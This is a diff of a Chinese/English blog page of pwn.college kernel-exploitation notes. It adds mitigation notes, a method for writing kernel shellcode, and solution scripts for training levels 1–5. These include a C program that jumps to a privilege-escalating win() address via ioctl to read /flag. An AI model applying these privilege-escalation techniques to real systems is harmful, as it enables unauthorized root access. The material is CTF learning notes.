@@ -44,8 +44,10 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220512222315120.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220519155802133.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220523182826589.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220524205647223.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220524211101441.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-23T15:57:23.573Z">
+<meta property="article:modified_time" content="2022-05-24T14:15:04.962Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -231,7 +233,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      87k 字
+      89k 字
     </span>
   
 
@@ -240,7 +242,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1083 分钟
+      1119 分钟
     </span>
   
 
@@ -281,7 +283,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月23日 晚上
+                  不可视境界线最后变动于：2022年5月24日 晚上
                 
               </p>
             
@@ -2008,16 +2010,33 @@
 </ul>
 <h5 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h5><p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1DNxufs_WlQRkzBMjPD7UE1qRrd87XDGpfQSPkiajEyE/edit#slide=id.gfbef220448_0_48">SLIDES</a> many links.</p>
 <ul>
-<li><strong>Stack canaries:</strong> leak the canary!<br><strong>kASLR:</strong> leak the kernel base address!<br><strong>Heap/stack regions NX:</strong> ROP!</li>
-<li>Function Granular ASLR.</li>
-<li>Supervisor Memory Protection:<ul>
+<li><p><strong>Stack canaries:</strong> leak the canary!<br><strong>kASLR:</strong> leak the kernel base address!<br><strong>Heap/stack regions NX:</strong> ROP!</p>
+</li>
+<li><p>Function Granular ASLR.</p>
+</li>
+<li><p>Supervisor Memory Protection:</p>
+<ul>
 <li><strong>SMEP.</strong><br>Prevents kernel-space code from <strong>E</strong>xecuting userspace memory <em>at all ever</em>.</li>
 <li><strong>SMAP.</strong><br>Prevents kernel-space from even <strong>A</strong>ccessing userspace memory <em>unless the AC flag in the RFLAGS register is set</em>. Two ring0 instructions, stac and clac, manage this bit.</li>
 <li>Why separate these? in SLIDES.</li>
 </ul>
 </li>
 </ul>
-<h5 id="Environment-setup"><a href="#Environment-setup" class="headerlink" title="Environment setup"></a>Environment setup</h5><p>build for old kernel 5.4: <a target="_blank" rel="noopener" href="https://github.com/pwncollege/pwnkernel">set up an environment</a> </p>
+<h5 id="kernel-shellcode"><a href="#kernel-shellcode" class="headerlink" title="kernel shellcode"></a>kernel shellcode</h5><ul>
+<li>you cant use syscalls in kernel. just use call instruction with symbol addresses in /proc/kallsyms</li>
+<li>KASLR. if it is on, then I need to find a vulnerability to leak an kernel symbol address.</li>
+<li>indirect calls.</li>
+<li>seccomp escaping: notice gs segment register to figure out where the task struct is.</li>
+<li>The kernel is WAY too complex to figure out offsetsmanually.<br>Best option:<ol>
+<li>Write a kernel module in C with the actions you want<br>your shellcode to do.</li>
+<li>Build it for the kernel you want to attack (e.g., using<br>the vm build command in pwn.college).</li>
+<li> Reverse-engineer it to see how these actions work in<br>assembly.</li>
+<li>Re-implement that assembly in your shellcode!</li>
+</ol>
+</li>
+<li>be careful with kernel code context! Try to have it act like a normal function and <strong>return</strong> when it’s done.</li>
+</ul>
+<h5 id="Env-setup"><a href="#Env-setup" class="headerlink" title="Env setup"></a>Env setup</h5><p>build for old kernel 5.4: <a target="_blank" rel="noopener" href="https://github.com/pwncollege/pwnkernel">set up an environment</a> </p>
 <ul>
 <li>first complie stopping at <code>thunk_64.o</code>, due to missing symbol table.<ul>
 <li>revise <code>linux-5.4/tools/objtool/elf.c</code> line 380 -&gt; <a target="_blank" rel="noopener" href="https://www.spinics.net/lists/kernel/msg3797871.html">link</a> </li>
@@ -2029,29 +2048,62 @@
 </ul>
 <p>VM by qemu: </p>
 <ul>
-<li><p>require: new version of gdb, kernel with debug symbols, ASLR is off. </p>
+<li><p>require: new version of gdb, kernel with debug symbols, ASLR is off(in ./launch there is <code>-append</code> option for qemu, <strong>check its usage</strong>).</p>
 </li>
 <li><p>because the kernel is started with qemu, so can debug with gdb through port 1234.</p>
-<p><code>gdb linux-5.4/vmlinux</code> + <code>target remote :1234; b *0x400800</code> </p>
+<p><code>gdb linux-5.4/vmlinux</code> + <code>target remote :1234</code> (I added it into .gdbinit in pwnkernel/)</p>
 </li>
 <li><p><code>cat /proc/kallsyms</code>  you can see all symbols in kernel. because we disabled the kernel address space randomization, it will always be the same.</p>
 </li>
 <li><p> only a limited number of commands will work in vm. look <code>ls /bin</code> for details. Because the shell is provided by busybox, so there is a lack of functionality.</p>
 </li>
-<li><p>use <code>sh -l</code> to load ~/.profile. there is some convenient alias.</p>
+<li><p>use <code>sh -l</code> or <code>su - ctf</code> to load ~/.profile. there is some convenient aliases.</p>
 </li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1Ik7EWjn_9ywzCW3MpJJ0eVdIvhIMP6brObBQQDtYDCo/edit#slide=id.ga548015bd5_0_114">further setup is here</a> </p>
 <p>tips: </p>
 <ul>
-<li>wget command in build.sh has been added with -c option(–continue), which means that it won’t repeat download when there is an already existing file in the same directory.</li>
+<li>wget command in build.sh has been added with -c option(–continue), which means that it won’t repeat downloadiing when there is an already existing file in the same directory.</li>
 <li><code>mkdir -p</code> no error if existing.</li>
 </ul>
 <h5 id="online-environment"><a href="#online-environment" class="headerlink" title="online environment"></a>online environment</h5><ul>
 <li>I have no idea about what happened…….it suddenly worked and then shutdown…..</li>
 <li>太蠢了, 全都停不下来. 等会看一下writing kernel shellcode. 没用啊, 难不成全部都变成本地做? 也不是不行就是了…….</li>
-<li></li>
+<li> 只是不能debug. 暂未发现解决办法.</li>
 </ul>
+<h4 id="level1-3"><a href="#level1-3" class="headerlink" title="level1"></a>level1</h4><p>.0 level calls <code>printk()</code> function to give some info in kernel ring buffer. Obviously, .1 level doesn’t. </p>
+<p>tested in ipython:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>os.write(fd, <span class="hljs-string">&#x27;password&#x27;</span>)<br>os.read(fd, <span class="hljs-number">60</span>)<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2"></a>level2</h4><p>unlike previous level, there is no device_read() function, rather printk(flag) exists in device_write with password check.</p>
+<p>script is the same way.</p>
+<h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3"></a>level3</h4><p>the kernel module defines a win() function which will elevate the calling process privilege.</p>
+<p>once pass the check, current process(i.e., ipython), will run as root. then use <code>!cat /flag</code>. everything is done.</p>
+<p>even while the password is for previous level, it just still works……..</p>
+<h4 id="level4-5"><a href="#level4-5" class="headerlink" title="level4"></a>level4</h4><p>hijack the kernel module by <code>ioctl()</code>. it is in python <code>fcntl</code> module. <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/fcntl.html">doc</a> </p>
+<p>in python fcntl.fcntl() almost equals to fcntl.ioctl(), <strong>except for ioctol’s <em>arg</em> argument can accept <em>bytes</em></strong>.</p>
+<p>script:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fcntl, os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>fcntl.ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-string">b&#x27;ruysmamctudpofzh&#x27;</span>)<br><span class="hljs-comment">#then !cat /flag</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="level5-6"><a href="#level5-6" class="headerlink" title="level5"></a>level5</h4><p>device_ioctl() calls __x86_indirect_thunk_rbx.</p>
+<p>retpoline, __x86_indirect_thunk_rbx……what’re these?</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.4/source/arch/x86/lib/retpoline.S#L11">here</a> it is(<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/48089426/what-is-a-retpoline-and-how-does-it-work">here</a> is repoline and google’s <a target="_blank" rel="noopener" href="https://support.google.com/faqs/answer/7625886">article</a>). when debugging, I find that it just merely jumps to the address the register(<strong>rbx</strong>) points to. so many nested macros in kernel code…..</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">GENERATE_THUNK(_ASM_BX)<br>↘<br>#define __EXPORT_THUNK(sym) _ASM_NOKPROBE(sym); EXPORT_SYMBOL(sym)<br>#define EXPORT_THUNK(reg) __EXPORT_THUNK(__x86_indirect_thunk_ ## reg)<br>#define GENERATE_THUNK(reg) THUNK reg ; EXPORT_THUNK(reg)<br>↘<br>.macro THUNK reg<br>	.section .text.__x86.indirect_thunk<br><br>ENTRY(__x86_indirect_thunk_\reg)<br>	CFI_STARTPROC<br>	JMP_NOSPEC %\reg<br>	CFI_ENDPROC<br>ENDPROC(__x86_indirect_thunk_\reg)<br>.endm<br></code></pre></div></td></tr></table></figure>
+
+<p>what value dose the rbx hold before execute <code>jmp rbx</code> instruction? it is ioctl()’s <em>arg</em> argument.</p>
+<p>by <code>cat /proc/kallsyms | grep win</code> command,  the win()’s address can be easily found. <code> ffffffffc0000c5d t win  [challenge]</code> </p>
+<p>but in pwn.college….</p>
+<img src="../../image/pwn-modules/image-20220524205647223.png" srcset="/img/loading.gif" lazyload alt="image-20220524205647223" style="zoom:80%;" />
+
+<p>let’s give up this mysterious environment.</p>
+<p>script:</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-number">0xffffffffc0000c5d</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">2</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>I win.</p>
+<img src="../../image/pwn-modules/image-20220524211101441.png" srcset="/img/loading.gif" lazyload alt="image-20220524211101441" style="zoom:80%;" />
+
+<h4 id="level6-6"><a href="#level6-6" class="headerlink" title="level6"></a>level6</h4><p>begin kernel shellcoding!</p>
+<p>when writing to /proc/pwncollege, the device_write() in kernel will </p>
 <section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10
 <a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.
 <a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>这之后要接收puts的地址.
